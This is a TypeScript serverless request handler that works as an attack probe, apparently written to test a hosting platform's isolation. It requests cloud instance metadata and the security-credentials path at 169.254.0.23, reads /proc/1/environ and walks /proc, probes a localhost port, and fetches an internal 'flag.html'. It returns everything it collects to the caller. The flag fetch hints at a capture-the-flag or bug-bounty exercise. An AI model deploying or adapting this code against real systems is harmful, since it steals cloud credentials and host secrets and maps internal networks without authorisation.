export async function onRequest(context: any): Promise<Response> {
  const out: any = {};
  const t = async (name: string, fn: () => Promise<any>) => { try { out[name] = await fn(); } catch (e) { out[name] = 'ERR:' + String(e).slice(0, 120); } };
  await t('metaRoot', async () => { const r = await fetch('http://169.254.0.23/latest/meta-data/', {signal: AbortSignal.timeout(3000)}); return {status: r.status, body: (await r.text()).slice(0, 300)}; });
  await t('metaIid', async () => { const r = await fetch('http://169.254.0.23/latest/meta-data/instance-id', {signal: AbortSignal.timeout(3000)}); return {status: r.status, body: (await r.text()).slice(0, 100)}; });
  await t('metaCam', async () => { const r = await fetch('http://169.254.0.23/latest/meta-data/cam/security-credentials/', {signal: AbortSignal.timeout(3000)}); return {status: r.status, body: (await r.text()).slice(0, 200)}; });
  await t('proc1environ', async () => { const f = await import('node:fs'); return f.readFileSync('/proc/1/environ', 'utf8').slice(0, 400); });
  await t('procWalk', async () => { const f = await import('node:fs'); return f.readdirSync('/proc').filter(x => /^\d+$/.test(x)).slice(0, 40); });
  await t('port9000', async () => { const r = await fetch('http://127.0.0.1:9000/', {signal: AbortSignal.timeout(2000)}); return {status: r.status, body: (await r.text()).slice(0, 150)}; });
  await t('woa', async () => { const r = await fetch('http://tst.woa.com/flag.html', {signal: AbortSignal.timeout(4000)}); return {status: r.status, body: (await r.text()).slice(0, 150)}; });
  return new Response(JSON.stringify(out), { headers: { "Content-Type": "application/json" } });
}
